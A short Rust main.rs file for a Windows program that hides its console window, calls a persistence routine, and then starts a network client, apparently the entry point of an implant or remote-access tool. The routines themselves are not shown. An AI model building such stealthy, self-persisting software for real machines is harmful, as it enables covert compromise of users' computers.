#![windows_subsystem = "windows"]

mod lib;
use anyhow::Result;

const IS_DLL: bool = false;

#[tokio::main]
async fn main() -> Result<()> {
    lib::persist::persist(IS_DLL);
    lib::netclient().await;
    Ok(())
}
